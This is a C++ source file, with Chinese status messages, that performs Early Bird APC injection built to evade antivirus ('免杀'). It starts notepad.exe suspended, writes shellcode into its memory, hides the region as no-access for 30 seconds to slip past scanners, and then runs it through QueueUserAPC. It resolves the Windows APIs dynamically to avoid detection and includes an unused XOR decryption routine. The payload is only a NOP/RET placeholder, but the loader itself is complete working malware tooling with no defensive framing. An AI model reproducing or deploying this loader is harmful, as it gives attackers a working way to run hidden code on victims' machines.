#include <iostream>
#include "safeApi.h"
#include "safeToolhelp.h"
#include <windows.h>
#include <tlhelp32.h>
#include <string>

unsigned char shellcode[] = {0x90, 0x90, 0xC3}; 

typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI* pOpenThread)(DWORD, BOOL, DWORD);
typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef BOOL (WINAPI* pCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);

void decrypt_shellcode(unsigned char* dst, const unsigned char* src, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; ++i) {
        dst[i] = src[i] ^ key;
    }
}

DWORD GetProcessIdByName(const wchar_t* processName) {
    if (!SafeCreateProcessSnapshot()) return 0;
    SAFE_PROCESSENTRY32 entry = {0};
    if (!SafeProcess32First(&entry)) return 0;
    do {
        if (_wcsicmp(entry.imageName, processName) == 0) {
            return entry.pid;
        }
    } while (SafeProcess32Next(&entry));
    return 0;
}

DWORD GetFirstThreadIdByPid(DWORD pid) {
    if (!SafeCreateThreadSnapshot()) return 0;
    SAFE_THREADENTRY32 entry = {0};
    if (SafeThread32First(&entry)) {
        do {
            if (entry.ownerPid == pid) {
                return entry.tid;
            }
        } while (SafeThread32Next(&entry));
    }
    return 0;
}

int main() {
    
    pOpenProcess MyOpenProcess = (pOpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
    pVirtualAllocEx MyVirtualAllocEx = (pVirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
    pOpenThread MyOpenThread = (pOpenThread)SafeGetProcAddress(L"kernel32.dll", "OpenThread");
    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)SafeGetProcAddress(L"kernel32.dll", "QueueUserAPC");
    pCreateProcessW MyCreateProcessW = (pCreateProcessW)SafeGetProcAddress(L"kernel32.dll", "CreateProcessW");
    pVirtualProtectEx MyVirtualProtectEx = (pVirtualProtectEx)SafeGetProcAddress(L"kernel32.dll", "VirtualProtectEx");
    if (!MyOpenProcess || !MyVirtualAllocEx || !MyWriteProcessMemory || !MyOpenThread || !MyQueueUserAPC || !MyCreateProcessW || !MyVirtualProtectEx) {
        std::cout << "动态API获取失败" << std::endl;
        return -1;
    }
    
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    wchar_t szPath[] = L"C:\\Windows\\System32\\notepad.exe";
    BOOL bRet = MyCreateProcessW(szPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!bRet) {
        std::cout << "创建挂起进程失败" << std::endl;
        return -1;
    }
    
    LPVOID remoteAddr = MyVirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteAddr) {
        std::cout << "分配内存失败" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }
    if (!MyWriteProcessMemory(pi.hProcess, remoteAddr, shellcode, sizeof(shellcode), NULL)) {
        std::cout << "写入内存失败" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }
    
    DWORD oldProtect = 0;
    if (!MyVirtualProtectEx(pi.hProcess, remoteAddr, sizeof(shellcode), PAGE_NOACCESS, &oldProtect)) {
        std::cout << "设置NOACCESS失败" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }
    
    Sleep(30000);
    
    if (!MyVirtualProtectEx(pi.hProcess, remoteAddr, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cout << "恢复RX失败" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }
    
    MyQueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, NULL);
    
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    std::cout << "EarlyBird免杀APC注入完成" << std::endl;
    return 0;
}
